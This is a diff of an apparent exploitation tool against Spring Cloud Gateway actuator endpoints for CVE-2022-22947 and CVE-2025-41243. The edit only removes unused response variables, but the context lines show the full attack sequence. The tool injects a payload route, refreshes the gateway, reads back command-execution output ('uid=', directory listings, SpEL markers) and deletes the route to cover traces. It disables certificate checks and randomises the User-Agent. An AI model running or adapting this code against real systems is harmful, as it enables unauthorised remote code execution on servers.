@@ -125,12 +125,12 @@ def CVE_2022_22947(url, proxies):
         requests.packages.urllib3.disable_warnings()
         random_string = generate_random_route(5)
         payload_new = payload_linux.replace('hacktest', random_string)
-        re1 = requests.post(url=url + "actuator/gateway/routes/" + random_string, timeout = outtime, data=payload_new, headers=headers1, json=json ,verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+        requests.post(url=url + "actuator/gateway/routes/" + random_string, timeout = outtime, data=payload_new, headers=headers1, json=json ,verify=False, proxies=proxies)
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
         re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-        re4 = requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+        requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
                               verify=False, proxies=proxies)
-        re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
                             proxies=proxies)
         if ('uid=' in str(re3.text)) and ('gid=' in str(re3.text)) and ('groups=' in str(re3.text)):
             cprint(f'[+] [CVE-2022-22947] {url}', "red")
@@ -140,12 +140,12 @@ def CVE_2022_22947(url, proxies):
         else:
             random_string = generate_random_route(5)
             payload_new = payload_linux.replace('hacktest', random_string)
-            re1 = requests.post(url=url + "actuator/gateway/routes/" + random_string, data=payload_new, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
-            re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
+            requests.post(url=url + "actuator/gateway/routes/" + random_string, data=payload_new, headers=headers1, timeout = outtime, json=json ,verify=False, proxies=proxies)
+            requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout = outtime, verify=False, proxies=proxies)
             re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout = outtime, verify=False, proxies=proxies)
-            re4 = requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+            requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
                                   verify=False, proxies=proxies)
-            re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
+            requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
                                 proxies=proxies)
             if ('<DIR>' in str(re3.text)):
                 cprint(f'[+] [CVE-2022-22947] {url}', "red")
@@ -400,7 +400,6 @@ def CVE_2025_41243(url, proxies):
         'User-Agent': random.choice(ua),
         'Content-Type': 'application/x-www-form-urlencoded'
     }
-    vul_status = 0
 
     payload = """{
   "id": "",
@@ -442,15 +441,15 @@ def CVE_2025_41243(url, proxies):
     try:
         cprint("[+] 正在发送Payload", "green")
         requests.packages.urllib3.disable_warnings()
-        re1 = requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
+        requests.post(url=url + "actuator/gateway/routes/" + random_string, headers=headers1,
                             timeout=outtime, json=payload_json, verify=False, proxies=proxies)
-        re2 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime, verify=False,
                             proxies=proxies)
         re3 = requests.get(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
                            verify=False, proxies=proxies)
-        re4 = requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
+        requests.delete(url=url + "actuator/gateway/routes/" + random_string, headers=headers2, timeout=outtime,
                               verify=False, proxies=proxies)
-        re5 = requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
+        requests.post(url=url + "actuator/gateway/refresh", headers=headers2, timeout=outtime,
                             verify=False, proxies=proxies)
 
         if ('X-SpEL' in str(re3.text)):
